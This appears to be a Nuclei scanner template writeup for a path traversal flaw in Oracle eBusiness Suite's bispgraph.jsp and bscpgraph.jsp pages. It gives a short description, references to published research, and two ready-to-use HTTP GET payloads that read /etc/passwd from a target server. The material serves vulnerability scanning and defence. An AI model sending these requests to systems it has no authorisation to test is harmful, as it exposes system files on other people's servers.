# Nuclei Template: Oracle eBusiness Suite - Improper File Access
**Template ID:** oracle-ebs-bispgrapgh-file-read
**Vulnerability Class:** Path Traversal
**Severity:** Critical
**Source:** Nuclei Template (`oracle-ebs-bispgraph-file-access.yaml`)

## Vulnerability Information & PoC

## Description
Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
GET {{BaseURL}}/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd
```

## References
- https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf
- http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
